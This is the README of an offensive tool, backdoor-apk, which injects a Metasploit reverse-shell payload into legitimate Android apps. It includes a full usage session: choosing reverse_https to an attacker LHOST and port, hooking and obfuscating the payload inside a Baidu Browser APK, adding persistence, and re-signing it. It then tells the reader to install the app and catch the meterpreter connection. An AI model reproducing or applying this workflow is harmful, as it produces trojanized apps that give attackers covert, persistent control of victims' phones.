# backdoor-apk
backdoor-apk is a shell script that simplifies the process of adding a backdoor to any Android APK file. Users of this shell script should have working knowledge of Linux, Bash, Metasploit, Apktool, the Android SDK, smali, etc. This shell script is provided as-is without warranty of any kind and is intended for educational purposes only.

Usage:

```
root@kali:~/Android/evol-lab/BaiduBrowserRat# ./backdoor-apk.sh BaiduBrowser.apk
          ________
         / ______ \
         || _  _ ||
         ||| || |||          AAAAAA   PPPPPPP   KKK  KKK
         |||_||_|||         AAA  AAA  PPP  PPP  KKK KKK
         || _  _o|| (o)     AAA  AAA  PPP  PPP  KKKKKK
         ||| || |||         AAAAAAAA  PPPPPPPP  KKK KKK
         |||_||_|||         AAA  AAA  PPP       KKK  KKK
         ||______||         AAA  AAA  PPP       KKK  KKK
        /__________\
________|__________|__________________________________________
       /____________\
       |____________|            Dana James Traversie

[*] Running backdoor-apk.sh v0.2.0 on Fri Feb 17 22:30:34 EST 2017
[+] Android payload options:
1) meterpreter/reverse_http   4) shell/reverse_http
2) meterpreter/reverse_https  5) shell/reverse_https
3) meterpreter/reverse_tcp    6) shell/reverse_tcp
[?] Please select an Android payload option: 2
[?] Please enter an LHOST value: 10.6.9.31
[?] Please enter an LPORT value: 443
[+] Handle the payload via resource script: msfconsole -r backdoor-apk.rc
[*] Generating RAT APK file...done.
[*] Decompiling RAT APK file...done.
[*] Decompiling original APK file...done.
[*] Merging permissions of original and payload projects...done.
[*] Running proguard on RAT APK file...done.
[*] Decompiling obfuscated RAT APK file...done.
[*] Creating new directories in original project for RAT smali files...done.
[*] Copying RAT smali files to new directories in original project...done.
[*] Fixing RAT smali files...done.
[*] Obfuscating const-string values in RAT smali files...done.
[*] Locating smali file to hook in original project...done.
[*] Adding hook in original smali file...done.
[*] Adding persistence hook in original project...done.
[*] Recompiling original project with backdoor...done.
[*] Generating RSA key for signing...done.
[*] Signing recompiled APK...done.
[*] Verifying signed artifacts...done.
[*] Aligning recompiled APK...done.
root@kali:~/Android/evol-lab/BaiduBrowserRat#
```

The recompiled APK will be found in the 'original/dist' directory. Install the APK on a compatible Android device, run it, and handle the meterpreter connection via the generated resource script: msfconsole -r backdoor-apk.rc
